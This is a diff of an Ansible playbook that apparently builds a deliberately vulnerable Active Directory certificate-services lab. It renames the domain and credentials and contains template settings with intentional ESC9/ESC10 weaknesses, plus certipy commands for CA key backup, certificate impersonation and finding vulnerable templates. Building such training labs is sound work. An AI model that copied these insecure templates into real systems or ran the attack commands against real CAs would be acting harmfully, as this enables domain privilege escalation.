@@ -1,7 +1,7 @@
 ---
 # ==============================================================================
 # vuln_df_ext/tasks/esc_ext.yml
-# Target: ca01.corp.local
+# Target: endor.empire.local
 #
 # ESC9   — No-security extension on template with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
 # ESC10  — Weak certificate mapping for user principal name spoofing
@@ -18,7 +18,7 @@
 - name: ESC9 - Check if DVADEsc9 template exists
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
-    $t = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" `
+    $t = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=empire,DC=local" `
            -Filter "Name -eq 'DVADEsc9'" -ErrorAction SilentlyContinue
     if ($t) { Write-Output "present" } else { Write-Output "absent" }
   register: esc9_check
@@ -27,11 +27,11 @@
 
 - name: ESC9 - Create DVADEsc9 certificate template (no security extension)
   ansible.windows.win_shell: |
-    $templateDN = "CN=DVADEsc9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
+    $templateDN = "CN=DVADEsc9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=empire,DC=local"
     # Duplicate from User template base, override msPKI-Enrollment-Flag
     # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1) | CT_FLAG_NO_SECURITY_EXTENSION (0x80000) = 0x80001
-    $baseTemplate = [ADSI]"LDAP://CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
-    $parent = [ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
+    $baseTemplate = [ADSI]"LDAP://CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=empire,DC=local"
+    $parent = [ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=empire,DC=local"
     $newTemplate = $parent.Create("pKICertificateTemplate", "CN=DVADEsc9")
     $newTemplate.Put("displayName", "DVADEsc9")
     $newTemplate.Put("msPKI-Cert-Template-OID", "1.3.6.1.4.1.311.21.8.12345609")
@@ -55,7 +55,7 @@
 - name: ESC10 - Check if DVADEsc10 template exists
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
-    $t = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" `
+    $t = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=empire,DC=local" `
            -Filter "Name -eq 'DVADEsc10'" -ErrorAction SilentlyContinue
     if ($t) { Write-Output "present" } else { Write-Output "absent" }
   register: esc10_check
@@ -64,7 +64,7 @@
 
 - name: ESC10 - Create DVADEsc10 template (weak mapping, any EKU)
   ansible.windows.win_shell: |
-    $parent = [ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
+    $parent = [ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=empire,DC=local"
     $newTemplate = $parent.Create("pKICertificateTemplate", "CN=DVADEsc10")
     $newTemplate.Put("displayName", "DVADEsc10")
     $newTemplate.Put("msPKI-Cert-Template-OID", "1.3.6.1.4.1.311.21.8.12345610")
@@ -95,10 +95,10 @@
       ESC12: CA Server DCOM Shell Access
       =====================================
       The Certificate Authority DCOM interface (ICertAdmin / ICertRequest) is accessible
-      to Authenticated Users on ca01.corp.local.
+      to Authenticated Users on endor.empire.local.
 
       Exploitation:
-        certipy ca -u jim.halpert@corp.local -p Password123! -ca corp-CA -dc-ip 10.10.0.10 \
+        certipy ca -u luke.skywalker@empire.local -p SithLord123! -ca corp-CA -dc-ip 10.10.0.10 \
           -backup        # Backup CA key via DCOM
         python3 darkarmour.py --ca corp-CA --cert backup.pfx ...
 
@@ -123,7 +123,7 @@
 
       Setup:
         # Get your own cert subject
-        certipy req -u attacker@corp.local -p Pass123 -ca corp-CA -template DVADUser
+        certipy req -u attacker@empire.local -p Pass123 -ca corp-CA -template DVADUser
 
         # Write to target account's AltSecurityIdentities
         Import-Module ActiveDirectory
@@ -152,5 +152,5 @@
         4. Group membership = Domain Admins (if OID is linked to DA group)
 
       Setup validation:
-        certipy find -u jim.halpert@corp.local -p Password123! -dc-ip 10.10.0.10 -vulnerable
+        certipy find -u luke.skywalker@empire.local -p SithLord123! -dc-ip 10.10.0.10 -vulnerable
       Look for templates with msPKI-Certificate-Policy containing linked OIDs.
